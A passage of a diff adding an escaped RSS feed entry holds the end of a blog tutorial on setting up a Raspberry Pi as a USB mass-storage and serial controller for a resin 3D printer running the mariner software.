+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Setup a container file for storing uploaded files:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ sudo dd &lt;span class="nv"&gt;bs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1M &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/zero &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/piusb.bin &lt;span class="nv"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2048&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ sudo mkdosfs /piusb.bin -F &lt;span class="m"&gt;32&lt;/span&gt; -I
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In this case I’m setting up a 2GB (2048MB) container. You can set up a bigger one by changing the &lt;code&gt;count&lt;/code&gt; parameter of &lt;code&gt;dd&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Create the mount point for the container file:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ sudo mkdir -p /mnt/usb_share
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Add the following line to your &lt;code&gt;/etc/fstab&lt;/code&gt; so the container file gets mounted on boot:&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;/piusb.bin /mnt/usb_share vfat users,gid=mariner,umask=002 0 2
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Finally, make &lt;code&gt;/etc/rc.local&lt;/code&gt; load the &lt;code&gt;g_mass_storage&lt;/code&gt; module by adding this to it:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;#!/bin/sh -e
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;modprobe g_mass_storage &lt;span class="nv"&gt;file&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/piusb.bin &lt;span class="nv"&gt;stall&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="nv"&gt;ro&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;exit&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once you restart the pi, the printer should start seeing the contents of &lt;code&gt;/mnt/usb_share&lt;/code&gt;. You should be able to &lt;code&gt;scp&lt;/code&gt; files to that directory and see them on the printer.&lt;/p&gt;
+&lt;h3 id="setting-up-the-serial-port"&gt;Setting up the serial port&lt;/h3&gt;
+&lt;p&gt;In order to have the Pi talk to the printer’s motherboard, we need to setup the serial port.&lt;/p&gt;
+&lt;p&gt;First, enable UART by adding this to &lt;code&gt;/boot/config.txt&lt;/code&gt;:&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;enable_uart=1
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Since we will be using the Pi’s serial port, you also need to disable the Pi’s console over the serial port:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ sudo systemctl stop serial-getty@ttyS0
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ sudo systemctl disable serial-getty@ttyS0
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Lastly, remove the console from &lt;code&gt;/boot/cmdline.txt&lt;/code&gt; by removing this from it:&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;console=serial0,115200
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id="wrapping-things-up"&gt;Wrapping things up&lt;/h2&gt;
+&lt;p&gt;Reboot the Pi and you will be all set. You can check that mariner is running with:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ sudo systemctl status mariner3d
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If everything is good, you should be able to access it by opening &lt;code&gt;http://&amp;lt;pi ip address&amp;gt;:5000/&lt;/code&gt; on your browser:&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://l9o.dev/img/screenshot2.png" alt=""&gt;&lt;/p&gt;
+&lt;p&gt;If something doesn’t work, checking the logs of &lt;code&gt;mariner3d&lt;/code&gt; generally helps:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ sudo journalctl -u mariner3d
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;That’s it! I hope this is helpful to someone. If you have questions, bugs to report or want more features on the software. Feel free to create an issue or a pull request on the &lt;a href="https://github.com/luizribeiro/mariner/"&gt;GitHub project&lt;/a&gt;!&lt;/p&gt;</description></item></channel></rss>
